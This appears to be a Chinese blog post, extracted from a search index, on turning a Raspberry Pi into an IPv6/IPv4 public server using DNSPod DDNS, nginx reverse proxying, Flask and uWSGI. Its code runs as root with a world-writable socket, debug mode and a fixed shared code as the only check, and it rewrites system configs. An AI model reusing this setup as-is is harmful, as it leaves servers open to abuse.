\u7ed3\u6784\uff1anginx\u8bbe\u5b9a\u8bf7\u6c42\u7684URL\uff0c\u5c06\u6b64URL\u7684\u8bf7\u6c42\u8bbe\u5b9a\u4e3a\u8f6c\u53d1\u5230flask\u5e94\u7528\u4e0a\uff1buwsgi\u4f5c\u4e3aflask\u548cnginx\u4e4b\u95f4\u7684\u6865\u6881\uff0c\u5e76\u4e14\u7528\u6765\u7ba1\u7406flask\u5e94\u7528\uff1bflask\u4f5c\u4e3a\u7f51\u7edc\u6846\u67b6\u63d0\u4f9b\u7f51\u7edc\u652f\u6491\uff0c\u5904\u7406\u8bf7\u6c42\u6570\u636e\u548c\u6570\u636e\u7684\u8fd4\u56de\uff1bpython\u4f5c\u4e3aflask\u91cc\u7684\u5177\u4f53\u5b9e\u73b0\uff0c\u7528\u6765\u8c03\u7528DNSPod API\uff0c\u4ee5\u53ca\u4fee\u6539nginx\u914d\u7f6e\u6587\u4ef6\uff0c\u5b9e\u73b0\u52a8\u6001\u7684\u53cd\u5411\u4ee3\u7406\u3002 DDNS\u90e8\u5206 \u5148\u8d34\u4e3b\u8981\u4ee3\u7801\uff1a def update_dnspod(self, ip): url = 'https://dnsapi.cn/Record.Modify' info = { 'login_email': 'xxx', 'login_password': 'xxx', 'format': 'json', 'domain_id': '23606146', 'record_id': '116841773', 'record_line': '\u9ed8\u8ba4', 'sub_domain': 'test', 'record_type': 'AAAA', 'value': ip } data = urllib.parse.urlencode(info).encode() t = urllib.request.urlopen(url, data=data) return t.read().decode('utf-8') \u5b9e\u9645\u4e0a\u5c31\u662f\u8c03\u7528API\u4e86\uff0c\u6211\u8fd9\u91cc\u662f\u5728\u66f4\u65b0test.polarxiong.com\u7684\u8bb0\u5f55\u3002 \u5173\u4e8e\u9700\u8981domain_id\u548crecord_id\uff0c\u4f3c\u4e4e\u53ea\u80fd\u4eceAPI\u83b7\u53d6 \uff0c\u5199\u4e86\u4e00\u6bb5\u4ee3\u7801\u7528\u6765\u83b7\u53d6\uff1a import urllib.request import urllib.parse import json login_email = 'THE_EMAIL' login_password = 'THE_PASSWORD' def get_json(url, data): con = urllib.request.urlopen( url, data=urllib.parse.urlencode(data).encode()) return json.loads(con.read().decode()) def get_domain_id(): url = 'https://dnsapi.cn/Domain.List' data = { 'login_email': login_email, 'login_password': login_password, 'format': 'json' } json = get_json(url, data) for domain in json['domains']: print('domain name:%s\\tdomain id:%s' % (domain['name'], domain['id'])) def get_record_id(domain_id): url = 'https://dnsapi.cn/Record.List' data = { 'login_email': login_email, 'login_password': login_password, 'format': 'json', 'domain_id': domain_id } json = get_json(url, data) print('domain name:%s\\tdomain id:%s' % (json['domain']['name'], json['domain']['id'])) for record in json['records']: print('record name:%s\\trecord type:%s\\trecord id:%s' % (record['name'], record['type'], record['id'])) if __name__ == '__main__': get_domain_id() \u6ce8\u610f\uff1a \u5bf9\u4e8e\u4fee\u6539\u8bb0\u5f55API\u7684\u8c03\u7528\uff0cDNSPod\u6709\u9650\u5236\uff1a\u5982\u679c1\u5c0f\u65f6\u4e4b\u5185\uff0c\u63d0\u4ea4\u4e86\u8d85\u8fc75\u6b21\u6ca1\u6709\u4efb\u4f55\u53d8\u52a8\u7684\u8bb0\u5f55\u4fee\u6539\u8bf7\u6c42\uff0c\u8be5\u8bb0\u5f55\u4f1a\u88ab\u7cfb\u7edf\u9501\u5b9a1\u5c0f\u65f6\uff0c\u4e0d\u5141\u8bb8\u518d\u6b21\u4fee\u6539\u3002\u6bd4\u5982\u539f\u8bb0\u5f55\u503c\u5df2\u7ecf\u662f 1.1.1.1\uff0c\u65b0\u7684\u8bf7\u6c42\u8fd8\u8981\u6c42\u4fee\u6539\u4e3a 1.1.1.1\u3002 \u53cd\u5411\u4ee3\u7406\u90e8\u5206 nginx\u914d\u7f6e\u6587\u4ef6\u4e2d\u53cd\u5411\u4ee3\u7406server\uff1a server { listen 80; server_name pi.polarxiong.com; location / { proxy_pass http://[2001:250:5002:8100::3:9b63]; # for raspberry pi proxy_set_header Host $host; } } python\u5b9e\u73b0\u4ee3\u7801\uff1a def update_nginx_config(self, ip): with open('/etc/nginx/sites-available/default', 'r') as f: s = f.read() r = re.compile(r'http://\\[(.*?)\\]; \\# for raspberry pi') s = s.replace(r.findall(s)[0], ip) with open('/etc/nginx/sites-available/default', 'w') as f: f.write(s) os.popen('service nginx restart') \u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6\u540e\uff0c\u901a\u8fc7\u6b63\u5219\u8868\u8fbe\u5f0f\u627e\u5230\u9700\u8981\u4fee\u6539\u7684IPv6\u5730\u5740\uff08 \u6240\u4ee5# for raspberry pi\u5fc5\u4e0d\u53ef\u5c11 \uff09\uff0c\u518d\u901a\u8fc7\u5b57\u7b26\u4e32\u66ff\u6362\uff08\u5c1d\u8bd5\u76f4\u63a5\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u66ff\u6362\uff0c\u4f46\u4e00\u76f4\u6ca1\u5b9e\u73b0\uff09\uff0c\u91cd\u65b0\u5199\u5165\u914d\u7f6e\u6587\u4ef6\uff1b\u6700\u540e\u91cd\u542fnginx\u670d\u52a1\u3002 \u5b9e\u9645\u4e0a\u8fd9\u662f\u4e00\u6bb5\u5f88\u5371\u9669\u7684\u4ee3\u7801\uff0c\u4f1a\u76f4\u63a5\u4fee\u6539nginx\u914d\u7f6e\u6587\u4ef6\uff0c\u5e76\u4e14\u901a\u8fc7\u547d\u4ee4\u884c\u91cd\u542fnginx\u670d\u52a1\u3002 Flask\u914d\u7f6e \u5148\u8d34\u4ee3\u7801\uff1a from flask import Flask, request import Ddns application = Flask(__name__) @application.route('/ipv6') def ipv6(): code = request.args['code'] if code != '80': return 'Bad Request' ip = request.remote_addr d = Ddns.Ddns() t = d.update(ip) return t if __name__ == '__main__': application.debug = True application.run() \u5ba2\u6237\u7aef\u53d1\u9001GET\u8bf7\u6c42\uff0cFlask\u6536\u5230\u8bf7\u6c42\u540e\u9996\u5148\u6821\u5bf9 code \uff0c\u7528\u6765\u9632\u6b62\u6076\u610f\u8bf7\u6c42\u3002\u7136\u540e\u83b7\u53d6\u5ba2\u6237\u7aefIP\u5730\u5740\uff0c\u4ea4\u7ed9python\u53bb\u5b9e\u73b0\u3002 uwsgi\u914d\u7f6e \u5173\u4e8enginx+uwsgi+flask\u7684\u914d\u7f6e\u5728\u4e4b\u524d\u7684\u6587\u7ae0\u4e2d\u4ecb\u7ecd\u8fc7\uff0c\u8fd9\u91cc\u5c31\u53ea\u5199\u4e3b\u8981\u90e8\u5206 systemd\u4e2d\u914d\u7f6e\u670d\u52a1 \u8def\u5f84\uff1a /etc/systemd/system/ddns.service [Unit] Description=uWSGI instance to serve DDNS After=network.target [Service] User=root Group=root WorkingDirectory=/home/zhantong/ddns Enrironment=\"PATH=/usr/bin\" ExecStart=/usr/bin/uwsgi --ini ddns.ini [Install] WantedBy=multi-user.target \u8fd9\u91cc\u8bbe\u5b9aUser\u548cGroup\u5747\u4e3aroot\u662f\u6781\u5176\u5371\u9669\u7684\uff0c\u4f46\u4e5f\u662f\u5fc5\u987b\u7684\uff0c\u56e0\u4e3a\u9700\u8981\u8bfb\u53d6\u548c\u5199\u5165nginx\u914d\u7f6e\u6587\u4ef6\uff0c\u5e76\u4e14\u901a\u8fc7\u547d\u4ee4\u884c\u91cd\u542fnginx\u670d\u52a1\u3002 uwsgi\u914d\u7f6e\u6587\u4ef6 \u8def\u5f84\uff1a /home/zhantong/ddns [uwsgi] module = proxy_and_ddns processes = 1 vhost = true socket = ddns.sock chmod-socket = 777 vacuum = true die-on-term = true \u8fd9\u91cc\u5176\u5b9e\u6709\u4e00\u4e9b\u7ec6\u8282\u95ee\u9898\uff0c\u5c31\u4e0d\u8bf4\u4e86\u3002 proxy_and_ddns \u5c31\u662f proxy_and_dds.py \uff0cflask\u4ee3\u7801\u3002 nginx\u914d\u7f6e \u6700\u540e\u9700\u8981\u52a0\u5165\u8bf7\u6c42URL\uff0c\u5e76\u5c06\u5176\u8f6c\u53d1\u5230flask\uff0c\u6240\u4ee5nginx\u5173\u4e8e\u8fd9\u90e8\u5206\u7684server\uff1a server { listen [::]:80 ipv6only=on; server_name ipv6.polarxiong.com; location / { include uwsgi_params; uwsgi_pass unix:/home/zhantong/ddns/ddns.sock; } } ipv6.polarxiong.com\u5728DNSPod\u4e2d\u8bbe\u7f6e\u4e86\u8bb0\u5f55\u4e3aAAAA\uff0c\u6307\u5411\u8fdc\u7a0b\u670d\u52a1\u5668\u7684IPv6\u5730\u5740\u3002 \u672c\u5730\u670d\u52a1\u5668 \u672c\u5730\u670d\u52a1\u5668\u7684\u5de5\u4f5c\u5176\u5b9e\u5f88\u7b80\u5355\uff0c\u5c31\u662f\u5bf9\u5bf9\u5e94URL\u53d1\u9001GET\u8bf7\u6c42 import urllib.request code = '80' urllib.request.urlopen('http://ipv6.polarxiong.com/ipv6?code=' + code) \u53ef\u4ee5\u5229\u7528Ubuntu\u4e2d\u7684corn\u6765\u5b9e\u73b0\u5b9a\u65f6\u8fd0\u884c\u3002 \u7ed3\u675f \u4e0a\u9762\u8bf4\u7684\u5f88\u4e71\uff0c\u4f46\u7406\u987a\u4e86\u8fd8\u662f\u633a\u5bb9\u6613\u7684\uff0c\u6700\u540e\u7684\u7ed3\u679c\u5c31\u662ftest.polarxiong.com\u5bf9\u5e94\u7684IP\u5c31\u662f\u6811\u8393\u6d3e\u7684IPv6\u5730\u5740\uff0c\u5373\u901a\u8fc7IPv6\u8bbf\u95eetest.polarxiong.com\u5c31\u662f\u76f4\u63a5\u8bbf\u95ee\u6811\u8393\u6d3e\uff1b\u800cpi.polarxiong.com\u662f\u901a\u8fc7\u8fdc\u7a0b\u670d\u52a1\u5668\u53cd\u5411\u4ee3\u7406\uff0c\u901a\u8fc7IPv4\u8bbf\u95ee\u6811\u8393\u6d3e\u3002 \u9644\u5f55 flask\u548cpython\u5b8c\u6574\u4ee3\u7801 flask \u6587\u4ef6\u540d\uff1aproxy_and_ddns.py from flask import Flask, request import Ddns application = Flask(__name__) @application.route('/ipv6') def ipv6(): code = request.args['code'] if code != '80': return 'Bad Request' ip = request.remote_addr d = Ddns.Ddns() t = d.update(ip) return t if __name__ == '__main__': application.debug = True application.run() python \u6587\u4ef6\u540d\uff1aDdns.py import urllib.request import os import re class Ddns(): def update_nginx_config(self, ip): with open('/etc/nginx/sites-available/default', 'r') as f: s = f.read() r = re.compile(r'http://\\[(.*?)\\]; \\# for raspberry pi') s = s.replace(r.findall(s)[0], ip) with open('/etc/nginx/sites-available/default', 'w') as f: f.write(s) os.popen('service nginx restart') def update_dnspod(self, ip): url = 'https://dnsapi.cn/Record.Modify' info = { 'login_email': 'xxx', 'login_password': 'xxx', 'format': 'json', 'domain_id': '23606146', 'record_id': '116841773', 'record_line': '\u9ed8\u8ba4', 'sub_domain': 'test', 'record_type': 'AAAA', 'value': ip } data = urllib.parse.urlencode(info).encode() t = urllib.request.urlopen(url, data=data) return t.read().decode('utf-8') def update(self, ip): t=self.update_dnspod(ip) self.update_nginx_config(ip) return t \u53c2\u8003 -- DNSPod\u7528\u6237API\u6587\u6863 \u2014 DNSPod API Doc 1.0.0 documentation \u7528 Python \u811a\u672c\u5b9e\u73b0\u5bf9 Linux \u670d\u52a1\u5668\u7684\u76d1\u63a7 Nginx\u53cd\u5411\u4ee3\u7406\u7684\u914d\u7f6e -- \u7b80\u660e\u73b0\u4ee3\u9b54\u6cd5 \u539f\u6587\u94fe\u63a5\uff1a https://www.polarxiong.com/archives/\u6811\u8393\u6d3e\u5229\u7528nginx\u53cd\u5411\u4ee3\u7406-\u6210\u4e3aIPv6-IPv4\u516c\u7f51\u670d\u52a1\u5668-\u9700\u8981\u8fdc\u7a0b\u53cc\u6808\u670d\u52a1\u5668.html","title":"\u6811\u8393\u6d3e\u5229\u7528nginx\u53cd\u5411\u4ee3\u7406\uff0c\u6210\u4e3aIPv6 IPv4\u516c\u7f51\u670d\u52a1\u5668\uff08\u9700\u8981\u8fdc\u7a0b\u53cc\u6808\u670d\u52a1\u5668\uff09"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#nginxipv6ipv4","text":"","title":"\u6811\u8393\u6d3e\u5229\u7528nginx\u53cd\u5411\u4ee3\u7406\uff0c\u6210\u4e3aIPv6/IPv4\u516c\u7f51\u670d\u52a1\u5668\uff08\u9700\u8981\u8fdc\u7a0b\u53cc\u6808\u670d\u52a1\u5668\uff09"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#_1","text":"\u6811\u8393\u6d3e\u53ea\u9700\u8fde\u63a5\u7535\u6e90\uff0c\u4ee5\u53ca\u6709\u514d\u8d39IPv6\u670d\u52a1\u7684\u7f51\u7ebf\uff0c\u5373\u53ef\u6210\u4e3a\u516c\u7f51\u4e0a\u7684IPv6\u670d\u52a1\u5668\uff1b\u5982\u679c\u6709\u540c\u65f6\u652f\u6301IPv4\u548cIPv6\u7684\u53cc\u6808\u670d\u52a1\u5668\uff0c\u6811\u8393\u6d3e\u8fd8\u80fd\u6210\u4e3a\u516c\u7f51\u4e0a\u7684IPv4\u670d\u52a1\u5668\u3002","title":"\u6548\u679c"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#_2","text":"\u4e4b\u524d\u53d1\u73b0\u5b66\u6821\u63d0\u4f9b\u514d\u8d39\u4e0d\u95f4\u65ad\u7684IPv6\u670d\u52a1\uff0c\u800c\u4e14DigitalOcean\u7684VPS\u4e5f\u80fd\u63d0\u4f9bIPv6\u7f51\u7edc\uff0c\u6240\u4ee5\u840c\u751f\u4e86\u81ea\u5df1\u5efa\u7acb\u670d\u52a1\u5668\u7684\u60f3\u6cd5\u3002 \u9274\u4e8e\u9700\u8981\u4e00\u53f0\u8017\u7535\u91cf\u5c0f\u3001\u566a\u58f0\u5c0f\u4e14\u80fd\u591f\u957f\u671f\u4e0d\u5173\u673a\u8fd0\u884c\u7684\u670d\u52a1\u5668\uff0c\u81ea\u7136\u800c\u7136\u60f3\u5230\u4e86\u6811\u8393\u6d3e\u3002\u4e8e\u662f\u7ecf\u8fc7\u51e0\u5929\u7684\u6298\u817e\uff0c\u7ec8\u4e8e\u5b9e\u73b0\u4e86\u628a\u6811\u8393\u6d3e\u4f5c\u4e3a\u516c\u7f51\u670d\u52a1\u5668\u7684\u60f3\u6cd5\uff0c\u4f46\u79bb\u7406\u60f3\u60c5\u51b5\u8fd8\u662f\u6709\u4e9b\u5dee\u8ddd\uff0c\u4e3b\u8981\u7279\u70b9\uff1a \u672c\u5730\u800c\u8a00\u53ea\u9700\u8981\u7528\u5230IPv6\u7f51\u7edc\uff0c\u5bf9IPv4\u7f51\u7edc\u6ca1\u6709\u8981\u6c42 \u4f5c\u4e3aIPv6\u670d\u52a1\u5668\uff0c\u91c7\u7528DDNS\u65b9\u6cd5\uff0c\u4f46\u5411DNSPod\u66f4\u65b0DNS\u4fe1\u606f\u9700\u8981\u6709\u672c\u5730\u6216\u8fdc\u7a0bIPv4\u7f51\u7edc\u7684\u652f\u6301 \u4f5c\u4e3aIPv4\u670d\u52a1\u5668\uff0c\u91c7\u7528nginx\u53cd\u5411\u4ee3\u7406\uff0c\u4e00\u5b9a\u9700\u8981\u8fdc\u7a0b\u53cc\u6808\u670d\u52a1\u5668\uff08\u7406\u8bba\u4e0a\u672c\u5730\u53cc\u6808\u7535\u8111\u4e5f\u53ef\u4ee5\uff09","title":"\u52a8\u673a"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#_3","text":"\u8fd9\u91cc\u5047\u8bbe\u7684\u90fd\u662f\u91c7\u7528\u8fdc\u7a0b\u670d\u52a1\u5668\uff0c\u5373DigitalOcean\u5728\u65e7\u91d1\u5c71\u7684\u540c\u65f6\u652f\u6301IPv4\u548cIPv6\u7684VPS\u3002","title":"\u5927\u4f53\u601d\u8def"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#ipv6","text":"\u6b64\u65f6\u91c7\u7528DDNS\u65b9\u6cd5\uff0c\u56e0\u4e3a\u81ea\u5df1\u6709\u57df\u540d\uff0c\u800cDNSPod\u652f\u6301IPv6\u7684AAAA\u8bb0\u5f55\uff0c\u4e14DNSPod\u63d0\u4f9bAPI\uff0c\u6240\u4ee5\u91c7\u7528\u6bcf\u6b21IPv6\u5730\u5740\u53d8\u5316\u5219\u5411DNSPod\u53d1\u9001\u4fee\u6539\u8bb0\u5f55\u8bf7\u6c42\uff0c\u8fd9\u6837\u5b9e\u73b0DDNS\u3002 \u5176\u4e2d\u5b58\u5728\u7684\u95ee\u9898\u662fDNSPod\u5e76\u4e0d\u652f\u6301\u7eafIPv6\u73af\u5883\u4e0b\u7684API\u8bf7\u6c42\uff0c\u5373\u53d1\u9001\u8bf7\u6c42\u5fc5\u987b\u7528\u5230IPv4\u7f51\u7edc\uff08\u901a\u8fc7IPv4\u7f51\u7edc\u53d1\u9001IPV6\u8bb0\u5f55\u7684\u4fee\u6539\u8bf7\u6c42\uff09\u3002\u6240\u4ee5\u91c7\u7528\u8fdc\u7a0b\u670d\u52a1\u5668\uff0c\u672c\u5730\u901a\u8fc7IPv6\u4f5c\u4e3ahttp\u7684client\u8bbf\u95ee\u8fdc\u7a0b\u670d\u52a1\u5668\uff0c\u8fdc\u7a0b\u670d\u52a1\u5668\u4f5c\u4e3ahttp server\u63a5\u6536\u8bf7\u6c42\uff0c\u5e76\u8bb0\u5f55\u8bf7\u6c42\u7684IPv6\u5730\u5740\uff08\u5373\u672c\u5730\u670d\u52a1\u5668IPv6\u5730\u5740\uff09\uff0c\u7136\u540e\u8fdc\u7a0b\u670d\u52a1\u5668\u901a\u8fc7IPv4\u8c03\u7528DNSPod API\uff0c\u4fee\u6539\u5bf9\u5e94\u8bb0\u5f55\uff0c\u5b9e\u73b0DDNS\u3002","title":"\u4f5c\u4e3aIPv6\u670d\u52a1\u5668"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#ipv4","text":"\u6b64\u65f6\u91c7\u7528\u53cd\u5411\u4ee3\u7406\u65b9\u6cd5\uff0c\u8fdc\u7a0b\u670d\u52a1\u5668nginx\u8bbe\u7f6e\u53cd\u5411\u4ee3\u7406\uff0c\u5730\u5740\u4e3a\u672c\u5730\u670d\u52a1\u5668IPv6\u5730\u5740\u3002\u8fd9\u6837\u53ef\u4ee5\u5229\u7528DDNS\u65f6\u8fdc\u7a0b\u670d\u52a1\u5668\u5f97\u5230\u7684IPv6\u5730\u5740\uff0c\u6765\u66f4\u65b0nginx\u4e2d\u53cd\u5411\u4ee3\u7406\u7684\u8bbe\u7f6e\u3002 \u4e3e\u4f8b\u6765\u8bf4\uff0c\u5f53\u67d0\u4e2aIPv4\u7528\u6237\u60f3\u8981\u8bbf\u95ee\u672c\u5730\u670d\u52a1\u5668\u65f6\uff0c\u5176\u901a\u8fc7\u57df\u540d\u8bbf\u95ee\u9996\u5148\u4f1a\u901a\u8fc7IPv4\u8bbf\u95ee\u5230\u8fdc\u7a0b\u670d\u52a1\u5668\uff0c\u8fdc\u7a0b\u670d\u52a1\u5668\u53cd\u5411\u4ee3\u7406\u5c06\u8bf7\u6c42\u901a\u8fc7IPv6\u53d1\u9001\u5230\u672c\u5730\u670d\u52a1\u5668\uff0c\u672c\u5730\u670d\u52a1\u5668\u4f5c\u51fa\u54cd\u5e94\u540e\uff0c\u5c06\u7ed3\u679c\u901a\u8fc7IPv6\u8fd4\u56de\u5230\u8fdc\u7a0b\u670d\u52a1\u5668\uff0c\u8fdc\u7a0b\u670d\u52a1\u5668\u6700\u540e\u901a\u8fc7IPv4\u8fd4\u56de\u5230\u7528\u6237\u3002 \u53ef\u4ee5\u8bf4\u4e00\u6b21\u8bf7\u6c42\u9700\u8981\u8de8\u8d8a4\u6b21\u592a\u5e73\u6d0b\uff0c\u4f46\u6839\u636e\u5b9e\u9645\u6d4b\u8bd5\uff0c\u54cd\u5e94\u65f6\u95f4\u8fd8\u662f\u53ef\u4ee5\u63a5\u53d7\u7684\u3002","title":"\u4f5c\u4e3aIPv4\u670d\u52a1\u5668"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#_4","text":"","title":"\u5177\u4f53\u5b9e\u73b0"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#_5","text":"\u6811\u8393\u6d3e\u5e76\u6ca1\u6709\u4f7f\u7528\u5b98\u65b9\u56fa\u4ef6\uff0c\u800c\u662f\u6700\u521d\u91c7\u7528\u4e86Ubuntu 14.04 LTS\uff0c\u5176\u540e\u8f6c\u79fb\u5230Ubuntu 15.04\u3002\u56e0\u4e3a\u662f\u4f5c\u4e3aserver\u7528\uff0c\u6240\u4ee5\u66f4\u503e\u5411\u4e8e\u91c7\u7528Ubuntu\u7684server\u7248\u672c\u3002 \u5173\u4e8e\u6811\u8393\u6d3e\u5982\u4f55\u8fde\u4e0aIPv6\u7f51\u7edc\uff0c\u5b9e\u9645\u5c31\u662fUbuntu\u5982\u4f55\u8fde\u4e0aIPv6\u7f51\u7edc\u4e86\uff0c\u8fd9\u6837\u7684\u4f8b\u5b50\u5f88\u591a\uff0c\u5bf9\u4e8e\u67d0\u4e9b\u7279\u6b8a\u60c5\u51b5\uff0c\u6211\u4e4b\u524d\u4e5f\u6709\u5199\u53ef\u80fd\u7684\u89e3\u51b3\u65b9\u6cd5\u3002","title":"\u5173\u4e8e\u6811\u8393\u6d3e"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#_6","text":"\u56e0\u4e3a\u672c\u5730IPv6\u5730\u5740\u662fDHCP\u5206\u914d\uff0c\u4e00\u76f4\u5728\u53d8\u52a8\uff0c\u6240\u4ee5\u53ef\u80fd\u9700\u8981\u9891\u7e41\u5411\u8fdc\u7a0b\u670d\u52a1\u5668\u53d1\u9001\u8bf7\u6c42\u3002\u56e0\u4e3a\u6211\u7684\u8fdc\u7a0b\u670d\u52a1\u5668\u8fd0\u884c\u6709Flask\u5e94\u7528\uff0c\u800c\u6211\u5bf9Python\u6bd4\u8f83\u719f\u6089\uff0c\u52a0\u4e0a\u5bf9\u4e8e\u65b9\u6848\u5b9e\u73b0\u6211\u6bd4\u8f83\u503e\u5411\u4e8e\u7528http\u5b9e\u73b0\uff0c \u6240\u4ee5\u8003\u8651\u518d\u4e09\u51b3\u5b9a\u91c7\u7528nginx+uwsgi+flask+python \u3002 \u7ed3\u6784\uff1anginx\u8bbe\u5b9a\u8bf7\u6c42\u7684URL\uff0c\u5c06\u6b64URL\u7684\u8bf7\u6c42\u8bbe\u5b9a\u4e3a\u8f6c\u53d1\u5230flask\u5e94\u7528\u4e0a\uff1buwsgi\u4f5c\u4e3aflask\u548cnginx\u4e4b\u95f4\u7684\u6865\u6881\uff0c\u5e76\u4e14\u7528\u6765\u7ba1\u7406flask\u5e94\u7528\uff1bflask\u4f5c\u4e3a\u7f51\u7edc\u6846\u67b6\u63d0\u4f9b\u7f51\u7edc\u652f\u6491\uff0c\u5904\u7406\u8bf7\u6c42\u6570\u636e\u548c\u6570\u636e\u7684\u8fd4\u56de\uff1bpython\u4f5c\u4e3aflask\u91cc\u7684\u5177\u4f53\u5b9e\u73b0\uff0c\u7528\u6765\u8c03\u7528DNSPod API\uff0c\u4ee5\u53ca\u4fee\u6539nginx\u914d\u7f6e\u6587\u4ef6\uff0c\u5b9e\u73b0\u52a8\u6001\u7684\u53cd\u5411\u4ee3\u7406\u3002","title":"\u8fdc\u7a0b\u670d\u52a1\u5668\u7aef"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#ddns","text":"\u5148\u8d34\u4e3b\u8981\u4ee3\u7801\uff1a def update_dnspod(self, ip): url = 'https://dnsapi.cn/Record.Modify' info = { 'login_email': 'xxx', 'login_password': 'xxx', 'format': 'json', 'domain_id': '23606146', 'record_id': '116841773', 'record_line': '\u9ed8\u8ba4', 'sub_domain': 'test', 'record_type': 'AAAA', 'value': ip } data = urllib.parse.urlencode(info).encode() t = urllib.request.urlopen(url, data=data) return t.read().decode('utf-8') \u5b9e\u9645\u4e0a\u5c31\u662f\u8c03\u7528API\u4e86\uff0c\u6211\u8fd9\u91cc\u662f\u5728\u66f4\u65b0test.polarxiong.com\u7684\u8bb0\u5f55\u3002 \u5173\u4e8e\u9700\u8981domain_id\u548crecord_id\uff0c\u4f3c\u4e4e\u53ea\u80fd\u4eceAPI\u83b7\u53d6 \uff0c\u5199\u4e86\u4e00\u6bb5\u4ee3\u7801\u7528\u6765\u83b7\u53d6\uff1a import urllib.request import urllib.parse import json login_email = 'THE_EMAIL' login_password = 'THE_PASSWORD' def get_json(url, data): con = urllib.request.urlopen( url, data=urllib.parse.urlencode(data).encode()) return json.loads(con.read().decode()) def get_domain_id(): url = 'https://dnsapi.cn/Domain.List' data = { 'login_email': login_email, 'login_password': login_password, 'format': 'json' } json = get_json(url, data) for domain in json['domains']: print('domain name:%s\\tdomain id:%s' % (domain['name'], domain['id'])) def get_record_id(domain_id): url = 'https://dnsapi.cn/Record.List' data = { 'login_email': login_email, 'login_password': login_password, 'format': 'json', 'domain_id': domain_id } json = get_json(url, data) print('domain name:%s\\tdomain id:%s' % (json['domain']['name'], json['domain']['id'])) for record in json['records']: print('record name:%s\\trecord type:%s\\trecord id:%s' % (record['name'], record['type'], record['id'])) if 